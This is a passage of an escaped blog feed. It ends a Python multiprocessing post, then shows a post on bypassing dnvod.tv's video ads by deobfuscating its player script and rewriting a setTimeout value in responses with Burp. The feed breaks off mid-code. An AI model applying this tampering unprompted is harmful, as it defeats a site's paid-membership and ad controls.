                &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kwargs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="c1"&gt;# print(idx, &amp;#39;data&amp;#39;)&lt;/span&gt;
                &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="nb"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;tuple&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  &lt;span class="c1"&gt;# output must represent as tuple&lt;/span&gt;
                    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;output_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_DATA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;        Get data from output queue sequentially.&lt;/span&gt;
&lt;span class="sd"&gt;        (main process, unblocked, using round robin to find next available queue)&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="c1"&gt;# print(self.output_queues)&lt;/span&gt;
            &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queues&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queue_index&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_nowait&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  &lt;span class="c1"&gt;# get out&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_STOP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="k"&gt;del&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queues&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queue_index&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  &lt;span class="c1"&gt;# remove queue if it&amp;#39;s finished&lt;/span&gt;
                &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_DATA&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Empty&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;continue&lt;/span&gt;  &lt;span class="c1"&gt;# find next available&lt;/span&gt;
            &lt;span class="k"&gt;finally&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queues&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;# all finished&lt;/span&gt;
                    &lt;span class="k"&gt;return&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queue_index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queue_index&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queues&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;设计中input queue和output queue均限制了大小并在填满后阻塞，直到各自的消费者（分别是子进程、主进程的子线程）消费掉相应产品后才会继续执行，保证了内存不会被撑爆。比如：主进程的子线程无法快速消费运算结果-&amp;gt;阻塞子进程output queue-&amp;gt;阻塞主进程主线程输入input queue。&lt;/p&gt;
&lt;p&gt;实现本身采用了相对底层的模块完成，没有使用&lt;code&gt;multiprocessing&lt;/code&gt;自带的进程池和&lt;code&gt;JoinableQueue&lt;/code&gt;是为了保留更多的自定义扩展可能性。&lt;/p&gt;
&lt;h1&gt;可能的改进&lt;/h1&gt;
&lt;p&gt;作为一个通用方案，很显然它的通用型和性能还可以进一步提升。我目前能想到的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可能可以使用协程(Coroutine)代替线程，但是这个方案如何实现有待斟酌：1.我并不清楚Python的多进程Queue是否能当作aio中的Queue使用 2.何时切换生产者和消费者的执行&lt;/li&gt;
&lt;li&gt;可以引入&lt;code&gt;multiproecssing.Manager&lt;/code&gt;中基础数据类型，从而实现黑盒函数执行期间的跨进程变量修改&lt;/li&gt;
&lt;/ul&gt;</content><category term="python"></category><category term="multi-processing"></category><category term="multi-threading"></category><category term="programming"></category></entry><entry><title>多瑙视频广告移除思路及实现</title><link href="http://blog.yyx.me/posts/dnvod-ad-killer.html" rel="alternate"></link><published>2018-02-11T11:06:00-08:00</published><updated>2018-02-11T11:06:00-08:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2018-02-11:/posts/dnvod-ad-killer.html</id><summary type="html">&lt;p&gt;本文主要阐述了多瑙视频网站(dnvod.tv)广告移除的思路及可行实现。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;小白通道&lt;/h1&gt;
&lt;p&gt;首先代码仓库和使用方法送上：&lt;a href="https://github.com/GreatYYX/dnvod-ad-killer"&gt;https://github.com/GreatYYX/dnvod-ad-killer&lt;/a&gt;。然后不用往下看了。&lt;/p&gt;
&lt;h1&gt;背景铺垫&lt;/h1&gt;
&lt;p&gt;17年在美帝工作后，就再没来写过blog，一年一更的“好习惯”也被打破了。其实过去这一年多时间里自己在安全方面基本没有hands-on的动作，除了去某哥onsite前那晚上成功zuo si把手机上一个游戏给破解了然后华丽的gg，主要在研究以流量伪装手段绕过GFW的方法和binary文件准确恢复函数图谱的可能性，不过目前这两者都只停留在思路阶段（Sigh～菜的抠脚）。&lt;/p&gt;
&lt;p&gt;这次萌发动力写个文章主要是被多瑙的bling bling的广告闪瞎了可又掏不起银子充会员，而单纯的AdBlock / AdBlock Plus以及Chrome Extension里的&lt;a href="https://github.com/AugustusZ/Dnvod-Ad-Remover"&gt;dnvod-ad-remover&lt;/a&gt;都已经失效，于是乎只能寡人亲自操刀了。&lt;/p&gt;
&lt;h1&gt;思路概述&lt;/h1&gt;
&lt;h2&gt;前人走过的路&lt;/h2&gt;
&lt;p&gt;本着先做好功课再下手的一贯作风，去网上找了圈现有的思路。&lt;/p&gt;
&lt;p&gt;由于HTML5的普及，大多数视频网站已经抛弃了Flash播放器（比如激进的Youtube和一些不可描述的网站），而鉴于特殊国情，国内大多数采用HTML5和Flash两者并用的局面。HTML5本身作为开放的web标准，所有东西都是暴露在用户面前的，正所谓前端无秘密。因此之前的思路基本属于：屏蔽掉Flash播放器，转而强制使用HTML5播放器从而实施后续的移除。只不过目前dnvod已经强制要求使用Flash了，也不知道为何会采用这种逆时代进程的做法而不是换一种投放广告的思路。&lt;/p&gt;
&lt;p&gt;还有一则思路采用修改host表的方法，将几个ad来源的domain进行屏蔽。不过此方法最大的问题在于，相关的资源直接就出现了无法访问的情况，而现在最基本的判断是不是有AdBlock类插件的方案就是判断相应的资源能否下载成功（相比binary判断自身是否处于被调试状态要简单太多了）。所以一旦使用该方法，网页上就会告诉你，我和AdBlock你只能选一个。&lt;/p&gt;
&lt;h2&gt;长江后浪&lt;/h2&gt;
&lt;p&gt;前人的思路已经死在了沙滩上，因此只能另辟蹊径。&lt;/p&gt;
&lt;p&gt;其实主要是破解两个问题：1.移除视频前70s的广告和等待时间 2.移除那些闪闪发光的小广告。&lt;/p&gt;
&lt;h3&gt;移除视频前等待&lt;/h3&gt;
&lt;p&gt;对于第一点，本身网站界面加载的也只有基本的框架，评论、集数、广告均由js创建而来。而加载后最显而易见的就是视频播放区的这段dom：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;object&lt;/span&gt; &lt;span class="err"&gt;...&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    ...
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;param&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;movie&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/_player/954684356/ckplayer.swf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;param&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;flashvars&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;f=rtmp://s1-r1.dnvod.tv/kvod/mp4:lxj-hpfd-01-021E92666.mp4&amp;amp;amp;loaded=loadedHandler&amp;amp;amp;s=0&amp;amp;amp;b=0&amp;amp;amp;c=0&amp;amp;amp;a=&amp;amp;amp;i=//static.dnvod.tv/images/logo-group.jpg&amp;amp;amp;l=http://static.dnvod.tv/upload/video/201802081401510175878s.jpg|...&amp;amp;amp;r=http://public.dnvod.tv/c/c?position%3db%26i%3d376%26r%3d4|...&amp;amp;amp;t=10|10|10|10|10|10|10...&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;100%&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;100%&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ckplayer_a1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ckplayer_a1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;align&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;middle&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;application/x-shockwave-flash&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;pluginspage&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.macromedia.com/go/getflashplayer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;embed&lt;/span&gt; &lt;span class="err"&gt;...&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这段html比较长，重点部分主要是一个&lt;code&gt;object&lt;/code&gt;标签里面的两个&lt;code&gt;param&lt;/code&gt;及一个&lt;code&gt;embed&lt;/code&gt;。从这儿的第一个&lt;code&gt;param&lt;/code&gt;可以看出采用了一个叫做ckplayer的播放器，我查了下是个国人开发的通用的网页视频播放器。第二个&lt;code&gt;param&lt;/code&gt;是真正干活的地方了，利用&lt;code&gt;flashvar&lt;/code&gt;把网页参数传入播放器中。凭空猜测，&lt;code&gt;f&lt;/code&gt;是具体的视频地址，&lt;code&gt;l&lt;/code&gt;是左边广告，&lt;code&gt;r&lt;/code&gt;是右边广告，&lt;code&gt;t&lt;/code&gt;是每个广告时间，每组广告图片采用&lt;code&gt;|&lt;/code&gt;分割。于是上神器burp修改request的payload，不过竟然没有成功。这个思路是最最直接最最简单的，理论上来说应该是可行的，不过可能我当时实验时候有失误，于是阴差阳错的放弃了这个方法（后面会阐述这反而成了优势）。&lt;/p&gt;
&lt;p&gt;之后就从js上下手，过了一遍加载的js。有一个混淆了js特别值得注意，&lt;code&gt;playerselection-1.2.7.90.js&lt;/code&gt;。过一下反混淆器，代码的大致架子基本能还原出来（相比binary下反汇编的作业环境，js的这个的可读性还真不错）。快速scan一遍代码，感觉&lt;code&gt;settimeout&lt;/code&gt;最可能作为突破点，毕竟倒计时在js里面最直观的做法就是用这个函数。一个个过下去发现有个的值被设置成&lt;code&gt;70000&lt;/code&gt;，这不会就是70秒（70000ms）的广告吧？不好意思，对。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;loadedHandler&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="p"&gt;...&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;_vp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;noads&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x34&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;CKobject&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;getObjectById&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;_vp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ckid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x34&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x34&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;frontAdUnload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nx"&gt;_0xf706x34&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;frontAdUnload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]()&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="mi"&gt;70000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// &amp;lt;---- HERE!!!!! OMG F*** IT&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;随手在burp里把response body（注意这次不是改request是改response）改成10000，画面依然显示70s广告，不过到60s的时候就自动结束了。于是再接再厉，改成5000（此时记得&lt;code&gt;header&lt;/code&gt;中的&lt;code&gt;content-length&lt;/code&gt;也需要修改，否则malformat的包会被Chrome丢弃）。尝试把这个数字再改小就存在了没有了倒计时可广告仍然存在的问题，于是又定位了其他几个&lt;code&gt;settimeout&lt;/code&gt;：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;CheckPlay&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x8c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x8d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="p"&gt;...&lt;/span&gt;
        &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.playtimer&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x8c&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;toHHMMSS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]());&lt;/span&gt;
        &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;CheckPlay&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x8c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;PlayAds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706xf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xae&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;split&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xaf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x5&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;split&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x6&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;split&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xb1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x3&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;_0xf706xae&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;length&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; &lt;span class="nx"&gt;_0xf706x3&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_0xf706xae&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x3&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;indexOf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;swf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;_0xf706xae&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;splice&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;_0xf706xaf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;splice&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;_0xf706xb0&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;splice&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;_0xf706x3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;_0xf706x3&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
